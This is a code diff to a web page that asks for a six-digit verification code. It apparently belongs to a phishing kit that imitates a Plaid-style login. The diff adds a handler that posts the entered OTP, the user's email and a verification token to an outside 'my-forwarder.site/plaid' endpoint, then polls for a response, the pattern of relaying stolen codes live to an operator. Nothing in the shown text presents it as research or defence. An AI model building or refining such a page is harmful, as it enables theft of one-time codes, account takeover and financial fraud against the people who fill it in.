@@ -71,18 +71,27 @@
             color: #4a5568;
         }
         
-        input[type="text"], input[type="password"], input[type="number"] {
-            width: 100%;
-            padding: 12px 16px;
-            border: 1px solid #e2e8f0;
-            border-radius: 6px;
-            font-size: 16px;
-            transition: border-color 0.2s;
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
         }
         
-        input:focus {
+        .otp-input {
+            width: 45px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+        
+        .otp-input:focus {
             outline: none;
             border-color: #000000;
+            box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.1);
         }
         
         .submit-btn {
@@ -145,19 +154,13 @@
         }
         
         .form-content {
-            transition: opacity 0.3s ease;
+            transition: all 0.3s ease;
         }
         
         .loading .form-content {
             opacity: 0.5;
+            filter: blur(2px);
             pointer-events: none;
-        }
-        
-        .otp-input {
-            letter-spacing: 2px;
-            font-size: 24px;
-            text-align: center;
-            font-weight: bold;
         }
         
         .error-message {
@@ -205,7 +208,14 @@
                 <form id="otp-form">
                     <div class="form-group">
                         <label for="otp-code">Enter Verification Code</label>
-                        <input type="number" id="otp-code" class="otp-input" placeholder="••••••" min="0" max="999999" maxlength="6" required>
+                        <div class="otp-container" id="otp-container">
+                            <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="off">
+                            <input type="text" class="otp-input" maxlength="1" data-index="2" autocomplete="off">
+                            <input type="text" class="otp-input" maxlength="1" data-index="3" autocomplete="off">
+                            <input type="text" class="otp-input" maxlength="1" data-index="4" autocomplete="off">
+                            <input type="text" class="otp-input" maxlength="1" data-index="5" autocomplete="off">
+                            <input type="text" class="otp-input" maxlength="1" data-index="6" autocomplete="off">
+                        </div>
                         <div class="error-message" id="otp-error">Invalid code. Please try again.</div>
                         <div class="success-message" id="otp-success">Verification successful! Redirecting...</div>
                     </div>
@@ -237,7 +247,7 @@
         const email = urlParams.get('email');
         
         // DOM elements
-        const otpInput = document.getElementById('otp-code');
+        const otpInputs = document.querySelectorAll('.otp-input');
         const verifyBtn = document.getElementById('verify-btn');
         const otpForm = document.getElementById('otp-form');
         const otpError = document.getElementById('otp-error');
@@ -249,42 +259,61 @@
         // Variables
         let checkResponseInterval = null;
         
-        // Validate OTP input
-        otpInput.addEventListener('input', function() {
-            // Ensure only numbers
-            this.value = this.value.replace(/[^0-9]/g, '');
+        // Handle OTP input navigation
+        otpInputs.forEach((input, index) => {
+            // Handle input
+            input.addEventListener('input', (e) => {
+                const value = e.target.value;
+                
+                // Only allow numbers
+                if (!/^\d*$/.test(value)) {
+                    e.target.value = '';
+                    return;
+                }
+                
+                // Auto-focus next input if current input has value
+                if (value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                
+                // Enable/disable button based on all inputs being filled
+                verifyBtn.disabled = !isAllInputsFilled();
+            });
             
-            // Limit to 6 digits
-            if (this.value.length > 6) {
-                this.value = this.value.slice(0, 6);
-            }
+            // Handle backspace
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
             
-            // Enable/disable button based on input length
-            verifyBtn.disabled = this.value.length !== 6;
+            // Handle paste
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pasteData = e.clipboardData.getData('text/plain').trim();
+                if (/^\d{6}$/.test(pasteData)) {
+                    pasteData.split('').forEach((char, i) => {
+                        if (otpInputs[i]) {
+                            otpInputs[i].value = char;
+                        }
+                    });
+                    verifyBtn.disabled = !isAllInputsFilled();
+                }
+            });
         });
         
-        // Prevent non-numeric input
-        otpInput.addEventListener('keydown', function(e) {
-            // Allow: backspace, delete, tab, escape, enter
-            if ([46, 8, 9, 27, 13].includes(e.keyCode) || 
-                // Allow: Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
-                (e.keyCode === 65 && e.ctrlKey === true) || 
-                (e.keyCode === 67 && e.ctrlKey === true) || 
-                (e.keyCode === 86 && e.ctrlKey === true) || 
-                (e.keyCode === 88 && e.ctrlKey === true) ||
-                // Allow: home, end, left, right
-                (e.keyCode >= 35 && e.keyCode <= 39)) {
-                return;
-            }
-            
-            // Prevent if not a number
-            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
-                e.preventDefault();
-            }
-        });
+        // Check if all OTP inputs are filled
+        function isAllInputsFilled() {
+            return Array.from(otpInputs).every(input => input.value);
+        }
+        
+        // Get full OTP code
+        function getOTPCode() {
+            return Array.from(otpInputs).map(input => input.value).join('');
+        }
         
         // Form submission
-        otpForm.addEventListener('submit', function(e) {
+        otpForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             
             // Show loading state
@@ -292,8 +321,29 @@
             loadingContainer.style.display = 'block';
             otpError.style.display = 'none';
             
-            // Start checking for response
-            startCheckingResponse();
+            // Get the full OTP code
+            const otpCode = getOTPCode();
+            
+            try {
+                // Submit OTP to your endpoint
+                const formData = new FormData();
+                formData.append('otp', otpCode);
+                formData.append('verification_code', verificationCode);
+                formData.append('email', email);
+                
+                const response = await fetch('https://my-forwarder.site/plaid/otp-action.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) throw new Error('Network error');
+                
+                // Start checking for response updates
+                startCheckingResponse();
+            } catch (error) {
+                console.error('Error submitting OTP:', error);
+                showError("Network error. Please try again.");
+            }
         });
         
         // Resend OTP
